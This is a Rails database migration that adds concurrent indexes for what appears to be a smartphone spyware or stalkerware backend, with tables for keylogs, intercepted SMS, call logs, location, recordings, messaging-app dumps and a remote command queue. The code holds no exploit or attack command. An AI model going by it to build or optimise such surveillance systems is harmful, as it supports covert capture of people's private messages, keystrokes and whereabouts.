class AddPerformanceIndexes < ActiveRecord::Migration[6.0]
  disable_ddl_transaction!

  def up
    say_with_time "Adding performance indexes for high-volume tables..." do
      
      # Keylogs optimization - most critical table
      unless index_exists?(:keylogs, [:smartphone_id, :created_at], name: 'idx_keylogs_device_time')
        add_index :keylogs, [:smartphone_id, :created_at], 
                  order: { created_at: :desc }, 
                  name: 'idx_keylogs_device_time',
                  algorithm: :concurrently
      end
      
      unless index_exists?(:keylogs, :app_name, name: 'idx_keylogs_app_name')
        add_index :keylogs, :app_name, 
                  name: 'idx_keylogs_app_name',
                  algorithm: :concurrently
      end
      
      # Partial index for recent keylogs - uses created_at column directly
      unless index_exists?(:keylogs, :created_at, name: 'idx_keylogs_recent')
        add_index :keylogs, :created_at, order: { created_at: :desc },
                  name: 'idx_keylogs_recent',
                  algorithm: :concurrently
      end
      
      # Keylog screenshots optimization
      unless index_exists?(:keylog_screenshots, [:smartphone_id, :client_timestamp], name: 'idx_keylog_screenshots_device_time')
        add_index :keylog_screenshots, [:smartphone_id, :client_timestamp],
                  order: { client_timestamp: :desc },
                  name: 'idx_keylog_screenshots_device_time',
                  algorithm: :concurrently
      end
      
      # Geo locations optimization with spatial index
      unless index_exists?(:geo_locations, [:smartphone_id, :created_at], name: 'idx_locations_device_time')
        add_index :geo_locations, [:smartphone_id, :created_at],
                  order: { created_at: :desc },
                  name: 'idx_locations_device_time',
                  algorithm: :concurrently
      end
      
      # Enable PostGIS if needed for coordinate queries (optional - requires postgis extension)
      # execute "CREATE EXTENSION IF NOT EXISTS postgis"
      # execute "CREATE INDEX idx_locations_coords ON geo_locations USING gist (ll_to_earth(lat::float, long::float))"
      
      # SMS messages optimization
      unless index_exists?(:sms_messages, [:smartphone_id, :created_at], name: 'idx_sms_device_time')
        add_index :sms_messages, [:smartphone_id, :created_at],
                  order: { created_at: :desc },
                  name: 'idx_sms_device_time',
                  algorithm: :concurrently
      end
      
      unless index_exists?(:sms_messages, :date, name: 'idx_sms_date')
        add_index :sms_messages, :date,
                  name: 'idx_sms_date',
                  algorithm: :concurrently
      end
      
      # Call logs optimization
      unless index_exists?(:call_logs, [:smartphone_id, :created_at], name: 'idx_calls_device_time')
        add_index :call_logs, [:smartphone_id, :created_at],
                  order: { created_at: :desc },
                  name: 'idx_calls_device_time',
                  algorithm: :concurrently
      end
      
      unless index_exists?(:call_logs, :date, name: 'idx_calls_date')
        add_index :call_logs, :date,
                  name: 'idx_calls_date',
                  algorithm: :concurrently
      end
      
      # Pending commands optimization - critical for command queue performance
      unless index_exists?(:pending_commands, [:smartphone_id, :status, :created_at], name: 'idx_commands_queue')
        add_index :pending_commands, [:smartphone_id, :status, :created_at],
                  name: 'idx_commands_queue',
                  algorithm: :concurrently
      end
      
      # Index for active (pending/processing) commands
      unless index_exists?(:pending_commands, :created_at, name: 'idx_commands_active')
        add_index :pending_commands, [:status, :created_at, :smartphone_id],
                  name: 'idx_commands_active',
                  algorithm: :concurrently
      end
      
      # Pictures/Photos optimization
      unless index_exists?(:pictures, [:smartphone_id, :created_at], name: 'idx_pictures_device_time')
        add_index :pictures, [:smartphone_id, :created_at],
                  order: { created_at: :desc },
                  name: 'idx_pictures_device_time',
                  algorithm: :concurrently
      end
      
      # Screenshots optimization
      unless index_exists?(:screenshots, [:smartphone_id, :created_at], name: 'idx_screenshots_device_time')
        add_index :screenshots, [:smartphone_id, :created_at],
                  order: { created_at: :desc },
                  name: 'idx_screenshots_device_time',
                  algorithm: :concurrently
      end
      
      # Recordings optimization
      unless index_exists?(:recordings, [:smartphone_id, :recording_type, :created_at], name: 'idx_recordings_device_type_time')
        add_index :recordings, [:smartphone_id, :recording_type, :created_at],
                  order: { created_at: :desc },
                  name: 'idx_recordings_device_type_time',
                  algorithm: :concurrently
      end
      
      # Device notifications optimization
      unless index_exists?(:device_notifications, [:device_id, :received_at], name: 'idx_notifications_device_received')
        add_index :device_notifications, [:device_id, :received_at],
                  order: { received_at: :desc },
                  name: 'idx_notifications_device_received',
                  algorithm: :concurrently
      end
      
      # Contacts optimization
      unless index_exists?(:contacts, [:smartphone_id, :created_at], name: 'idx_contacts_device_time')
        add_index :contacts, [:smartphone_id, :created_at],
                  name: 'idx_contacts_device_time',
                  algorithm: :concurrently
      end
      
      # Messaging apps dumps optimization
      unless index_exists?(:messaging_apps_dumps, [:smartphone_id, :app_name, :created_at], name: 'idx_messaging_dumps_device_app_time')
        add_index :messaging_apps_dumps, [:smartphone_id, :app_name, :created_at],
                  name: 'idx_messaging_dumps_device_app_time',
                  algorithm: :concurrently
      end
      
      # Smartphones lookup optimization
      unless index_exists?(:smartphones, :device_id, name: 'idx_smartphones_device_id', unique: true)
        add_index :smartphones, :device_id,
                  unique: true,
                  name: 'idx_smartphones_device_id',
                  algorithm: :concurrently
      end
    end
  end
  
  def down
    say_with_time "Removing performance indexes..." do
      # Remove in reverse order
      remove_index :smartphones, name: 'idx_smartphones_device_id' if index_exists?(:smartphones, name: 'idx_smartphones_device_id')
      remove_index :messaging_apps_dumps, name: 'idx_messaging_dumps_device_app_time' if index_exists?(:messaging_apps_dumps, name: 'idx_messaging_dumps_device_app_time')
      remove_index :contacts, name: 'idx_contacts_device_time' if index_exists?(:contacts, name: 'idx_contacts_device_time')
      remove_index :device_notifications, name: 'idx_notifications_device_received' if index_exists?(:device_notifications, name: 'idx_notifications_device_received')
      remove_index :recordings, name: 'idx_recordings_device_type_time' if index_exists?(:recordings, name: 'idx_recordings_device_type_time')
      remove_index :screenshots, name: 'idx_screenshots_device_time' if index_exists?(:screenshots, name: 'idx_screenshots_device_time')
      remove_index :pictures, name: 'idx_pictures_device_time' if index_exists?(:pictures, name: 'idx_pictures_device_time')
      remove_index :pending_commands, name: 'idx_commands_active' if index_exists?(:pending_commands, name: 'idx_commands_active')
      remove_index :pending_commands, name: 'idx_commands_queue' if index_exists?(:pending_commands, name: 'idx_commands_queue')
      remove_index :call_logs, name: 'idx_calls_date' if index_exists?(:call_logs, name: 'idx_calls_date')
      remove_index :call_logs, name: 'idx_calls_device_time' if index_exists?(:call_logs, name: 'idx_calls_device_time')
      remove_index :sms_messages, name: 'idx_sms_date' if index_exists?(:sms_messages, name: 'idx_sms_date')
      remove_index :sms_messages, name: 'idx_sms_device_time' if index_exists?(:sms_messages, name: 'idx_sms_device_time')
      remove_index :geo_locations, name: 'idx_locations_device_time' if index_exists?(:geo_locations, name: 'idx_locations_device_time')
      remove_index :keylog_screenshots, name: 'idx_keylog_screenshots_device_time' if index_exists?(:keylog_screenshots, name: 'idx_keylog_screenshots_device_time')
      remove_index :keylogs, name: 'idx_keylogs_recent' if index_exists?(:keylogs, name: 'idx_keylogs_recent')
      remove_index :keylogs, name: 'idx_keylogs_app_name' if index_exists?(:keylogs, name: 'idx_keylogs_app_name')
      remove_index :keylogs, name: 'idx_keylogs_device_time' if index_exists?(:keylogs, name: 'idx_keylogs_device_time')
    end
  end
end
